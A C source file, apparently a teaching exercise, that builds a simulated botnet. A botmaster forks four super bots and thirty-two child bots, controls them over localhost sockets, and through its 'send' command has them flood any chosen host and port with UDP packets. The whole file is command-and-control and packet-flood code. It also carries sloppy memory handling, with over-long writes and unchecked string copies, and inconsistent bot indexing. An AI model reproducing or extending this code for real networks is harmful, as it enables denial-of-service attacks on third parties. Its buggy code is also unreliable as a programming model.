#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>

#define MASTER_PORT 2000



void child_bot(int id) {
    int super_fd, file_fd, victim_fd;
    struct sockaddr_in super, victim;
    int i, nparam, len;
    char msg[256];
    char idstr[10];
    char host[200], port[10];
    char filename[250];
    char attack_payload[] = "You are under attack. Zombies under control of botnet are sending you bunch of packets.";
    char *param, *tmp;
    if((super_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failed to open socket on child bot\n");
        exit(-1);
    }
    bzero((char *)&super, sizeof(super));
    super.sin_family = AF_INET;
    super.sin_addr.s_addr = inet_addr("127.0.0.1");
    super.sin_port = htons(MASTER_PORT+1001+(id-1)/8);
    if(connect(super_fd, (struct sockaddr*) &super, sizeof(super)) < 0) {
        printf("Connection from child bot to super bot failed\n");
        exit(-1);
    }
    write(super_fd, "a", 255);
    while(1) {
        read(super_fd, msg, 255);
        param = strtok(msg, " ");
        if(!strncmp(param, "show", 4)) {
            write(super_fd, "show", 255);
        }
        else if(!strncmp(param, "search", 6)) {
            write(super_fd, "search", 255);
        }
        else if(!strncmp(param, "date", 4)) {
            struct tm *tm;
            time_t t;
            t = time(NULL);
            tm = localtime(&t);
            strftime(msg, 255, "%a %b %d %T %Z %Y", tm);
            write(super_fd, msg, 255);
        }
        else if(!strncmp(param, "host", 4)) {
            gethostname(msg, 255);
            write(super_fd, msg, 255);
        }
        else if(!strncmp(param, "create", 6)) {
            param = strtok(NULL, " ");
            strcpy(filename, param);
            strcat(filename, "_");
            sprintf(idstr,"%d",id);
            strcat(filename, idstr);
            file_fd = open(filename, O_WRONLY | O_CREAT);
            close(file_fd);
            write(super_fd, filename, 255);
        }
        else if(!strncmp(param, "send", 4)) {
            param = strtok(NULL, " ");
            tmp = strchr(param, ':');
            strncpy(host, param, tmp - param);
            strncpy(port, tmp+1, strlen(param) - strlen(host) - 1);
            port[strlen(param) - strlen(host) -1] = 0;
            param = strtok(NULL, " ");
            nparam = atoi(param);
            if((victim_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
                printf("Socket for sending packet command failed\n");
                write(super_fd, "fail", 255);
                continue;
            }
            bzero((char *)&victim, sizeof(victim));
            victim.sin_family = AF_INET;
            victim.sin_addr.s_addr = inet_addr(host);
            victim.sin_port = htons(atoi(port));
            for(i=0; i<nparam; i++) {
                sendto(victim_fd, attack_payload, strlen(attack_payload), 0, (struct sockaddr*) &victim, sizeof(victim));
            }
            len = sprintf(msg, "[%d] send %d packets to %s:%s", id, nparam, host, port);
            //printf("%s\n",msg);
	    msg[len] = 0;
            write(super_fd, msg, 255);
            close(victim_fd);
        }
        else if(!strncmp(param, "quit", 4)) {
            printf("Child Bot %d quit\n", id);
            close(super_fd);
            return;
        }
        else {
            write(super_fd, "fail", 255);
        }
    }
}

void super_bot(int id) {
    int i, alive, nparam;
    int master_fd, listen_fd, child_fd[8], connect_len;
    char msg[256], filename[100], stat[100], buf[20];
    char *param;
    struct sockaddr_in master, child;
    if((master_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failed to open socket on super bot\n");
        exit(-1);
    }
    bzero((char *)&master, sizeof(master));
    master.sin_family = AF_INET;
    master.sin_addr.s_addr = inet_addr("127.0.0.1");
    master.sin_port = htons(MASTER_PORT);
    if(connect(master_fd, (struct sockaddr*) &master, sizeof(master)) < 0) {
        printf("Connection from super bot to bot master failed\n");
        exit(-1);
    }
    if((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failed to open socket on super bot\n");
        exit(-1);
    }
    bzero((char *)&child, sizeof(child));
    child.sin_family = AF_INET;
    child.sin_addr.s_addr = INADDR_ANY;
    child.sin_port = htons(MASTER_PORT + id);
    if(bind(listen_fd, (struct sockaddr*) &child, sizeof(child)) < 0) {
        printf("Failed to bind socket on super bot\n");
        exit(-1);
    }
    listen(listen_fd, 10);
    for(i=1; i<=8; i++) {
        if(fork()) {
            child_bot((id-1001) * 8 + i);
            return;
        }
    }
    connect_len = sizeof(child);
    for(i=0; i<8; i++) {
        if((child_fd[i] = accept(listen_fd, (struct sockaddr *) &child, &connect_len)) < 0) {
            printf("Failed to accept connection from child bot\n");
            exit(-1);
        }
    }
    alive = 0;
    for(i=0; i<8; i++) {
        read(child_fd[i], msg, 255);
        if(msg[0] == 'a') {
            alive++;
        }
    }
    sprintf(msg, "%d %d", id, alive);
    write(master_fd, msg, 255);
    while(1) {
        read(master_fd, msg, 255);
        param = strtok(msg, " ");
        if(!strncmp(param, "show", 4)) {
            strcpy(stat, "");
            for(i=0; i<8; i++) {
                write(child_fd[i], "show", 255);
                if(read(child_fd[i], msg, 255) > 0) {
                    sprintf(buf, "%d ", (id-1001)*8 + i + 1);
                    strcat(stat, buf);
                }
            }
            write(master_fd, stat, 255);
        }
        else if(!strncmp(param, "search", 6)) {
            param = strtok(NULL, " ");
            nparam = atoi(param);
            write(child_fd[(nparam-1) % 8], "search", 255);
            if(read(child_fd[(nparam-1) % 8], msg, 255) > 0) {
                write(master_fd, "alive", 255);
            }
            else {
                write(master_fd, "dead", 255);
            }
        }
        else if(!strncmp(param, "date", 4)) {
            param = strtok(NULL, " ");
            nparam = atoi(param);
            write(child_fd[(nparam-1) % 8], "date", 255);
            read(child_fd[(nparam-1) % 8], msg, 255);
            write(master_fd, msg, 255);
        }
        else if(!strncmp(param, "host", 4)) {
            param = strtok(NULL, " ");
            nparam = atoi(param);
            write(child_fd[(nparam-1) % 8], "host", 255);
            read(child_fd[(nparam-1) % 8], msg, 255);
            write(master_fd, msg, 255);
        }
        else if(!strncmp(param, "create", 6)) {
            param = strtok(NULL, " ");
            nparam = atoi(param);
            param = strtok(NULL, " ");
	    sprintf(msg, "%s %s", "create", param);
            write(child_fd[(nparam-1) % 8], msg, 255);
            read(child_fd[(nparam-1) % 8], filename, 255);
            sprintf(msg, "[%d] %s is created", nparam, filename);
            write(master_fd, msg, 255);
        }
        else if(!strncmp(param, "send", 4)) {
            param = strtok(NULL, " ");
            nparam = atoi(param);
            strcpy(msg, "send ");
            param = strtok(NULL, " ");
            strcat(msg, param);
            param = strtok(NULL, " ");
            strcat(msg, " ");
            strcat(msg, param);
            write(child_fd[(nparam-1) % 8], msg, 255);
            read(child_fd[(nparam-1) % 8], stat, 255);
            write(master_fd, stat, 255);
        }
        else if(!strncmp(param, "quit", 4)) {
            for(i=0; i<8; i++) {
                write(child_fd[i], "quit", 255);
            }
            for(i=0; i<8; i++) {
                close(child_fd[i]);
            }
            printf("Super Bot %d quit\n", id);
            close(listen_fd);
            close(master_fd);
            return;
        }
        else {
            write(master_fd, "I don't know", 255);
        }
    }
}

void usage() {
    printf("--------botnet command list----------\n");
    printf("show : Show a current botnet architecture\n");
    printf("search [child_bot_id] ... : Describe a state of the specified bot with its super bot ID\n");
    printf("read [-date | -host] [child_bot_id] ... : Read a system date or a host name\n");
    printf("create [filename] [child_bot_id] ... : Create a specified file named as filename_bot_id\n");
    printf("send [# of pkts] [host:port] [child_bot_id] ... : Send the number of packets to a specified host and port\n");
}

int main() {
    int i, err;
    char cmd[100], msg[256], show[100];
    char *param, *ipport, *count, filename[100];
    int nparam;
    int listen_fd, connect_fd[4], connect_len;
    struct sockaddr_in master, super;    
    struct sigaction sa;
    int super_id, child_num;

    printf("booting botnet...\n");
    if((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failed to open socket on bot master\n");
        return -1;
    }
    bzero((char *)&master, sizeof(master));
    master.sin_family = AF_INET;
    master.sin_addr.s_addr = INADDR_ANY;
    master.sin_port = htons(MASTER_PORT);
    if(bind(listen_fd, (struct sockaddr*) &master, sizeof(master)) < 0) {
        printf("Failed to bind socket on bot master\n");
        return -1;
    }
    listen(listen_fd, 10);

    for(i=1; i<=4; i++) {
        if(fork()) {
            super_bot(1000+i);
            return;
        }
    }
    connect_len = sizeof(super);
    for(i=0; i<4; i++) {
        if((connect_fd[i] = accept(listen_fd, (struct sockaddr *) &super, &connect_len)) < 0) {
            printf("Failed to accept connection from super bot to bot master\n");
            return -1;
        }
    }
    
    for(i=0; i<4; i++) {
        read(connect_fd[i], msg, 255);
        sscanf(msg, "%d %d", &super_id, &child_num);
        if(child_num != 8) {
            printf("Child bot spawning failed: %d children\n", child_num);
            return -1;
        }
        printf("report %d:[%d, %d, %d, %d, %d, %d, %d, %d]\n", super_id, (super_id-1001) * 8 + 1, (super_id-1001) * 8 + 2, (super_id-1001) * 8 + 3, (super_id-1001) * 8 + 4, (super_id-1001) * 8 + 5, (super_id-1001) * 8 + 6, (super_id-1001) * 8 + 7, (super_id-1001) * 8 + 8);
    }

    printf("a botnet is successfully constructed!\n");
    while(1) {
        printf("botnet > ");
        if(fgets(cmd, 100, stdin) == NULL) {
            continue;
        }
        param = strtok(cmd, " ");
        if(!strncmp(param, "show", 4)) {
            for(i=0; i<4; i++) {
                write(connect_fd[i], "show", 255);
                if(read(connect_fd[i], msg, 255)>0) {
                    param = strtok(msg, " ");
                    sprintf(show, "%d:[%s", 1001+i, param);
                    while((param = strtok(NULL, " ")) != NULL) {
                        strcat(show, ",");
                        strcat(show, param);
                    }
                    strcat(show, "]");
                    printf("%s\n", show);
                }
            }
        }
        else if(!strncmp(param, "search", 6)) {
            err = 1;
            while((param = strtok(NULL, " ")) != NULL) {
                err = 0;
                nparam = atoi(param);
                if(nparam < 1 || nparam > 32) {
                    err = 1;
                    break;
                }
                strcpy(msg, "search ");
                strcat(msg, param);
                write(connect_fd[nparam/8], msg, 255);
                if(read(connect_fd[nparam/8], msg, 255) > 0) {
                    printf("[%d:%d] %s\n", 1001+(nparam-1)/8, nparam, msg);
                }
            }
            if(err) {
                printf("No argument given OR Wrong argument given\n");
                continue;
            }
        }
        else if(!strncmp(param, "read", 4)) {
            param = strtok(NULL, " ");
            if(!strcmp(param, "-date")) {
                err = 1;
                while((param = strtok(NULL, " ")) != NULL) {
                    err = 0;
                    nparam = atoi(param);
                    if(nparam < 1 || nparam > 32) {
                        err = 1;
                        break;
                    }
                    strcpy(msg, "date ");
                    strcat(msg, param);
                    write(connect_fd[nparam/8], msg, 255);
                    read(connect_fd[nparam/8], msg, 255);
                    printf("[%d] %s\n", nparam, msg);
                }
                if(err) {
                    printf("No argument given OR Wrong argument given\n");
                }
            }
            else if(!strcmp(param, "-host")) {
                err = 1;
                while((param = strtok(NULL, " ")) != NULL) {
                    err = 0;
                    nparam = atoi(param);
                    if(nparam < 1 || nparam > 32) {
                        err = 1;
                        break;
                    }
                    strcpy(msg, "host ");
                    strcat(msg, param);
                    write(connect_fd[nparam/8], msg, 255);
                    read(connect_fd[nparam/8], msg, 255);
                    printf("[%d] %s\n", nparam, msg);
                }
                if(err) {
                    printf("No argument given OR Wrong argument given\n");
                }

            }
            else {
                printf("Wrong argument given\n");
                usage();
                continue;
            }
        }
        else if(!strncmp(param, "create", 6)) {
            strcpy(filename, strtok(NULL, " "));
	    printf("%s\n", filename);
            err = 1;
            while((param = strtok(NULL, " ")) != NULL) {
                err = 0;
                nparam = atoi(param);
                if(nparam < 1 || nparam > 32) {
                    err = 1;
                    break;
                }
                strcpy(msg, "create ");
                strcat(msg, param);
                strcat(msg, " ");
                strcat(msg, filename);
                write(connect_fd[nparam/8], msg, 255);
                read(connect_fd[nparam/8], msg, 255);
                printf("%s\n", msg);
            }
            if(err) {
                printf("No argument given OR Wrong argument given\n");
            }
        }
        else if(!strncmp(param, "send", 4)) {
            count = strtok(NULL, " ");
            ipport = strtok(NULL, " ");
            err = 1;
            while((param = strtok(NULL, " ")) != NULL) {
                err = 0;
                nparam = atoi(param);
                if(nparam < 1 || nparam > 32) {
                    err = 1;
                    break;
                }
                strcpy(msg, "send ");
                strcat(msg, param);
                strcat(msg, " ");
                strcat(msg, ipport);
                strcat(msg, " ");
                strcat(msg, count);
                write(connect_fd[nparam/8], msg, 255);
                read(connect_fd[nparam/8], msg, 255);
                printf("%s\n", msg);
            }
            if(err) {
                printf("No argument given OR Wrong argument given\n");
            }
        }
        else if(!strncmp(param, "quit", 4)) {
            for(i=0; i<4; i++) {
                write(connect_fd[i], "quit", 255);
            }
            for(i=0; i<4; i++) {
                close(connect_fd[i]);
            }
            printf("Botmaster quit\n");
            close(listen_fd);
            return 0;
        }
        else {
            printf("Undefined command\n");
            usage();
        }
    }
    return 0;
}
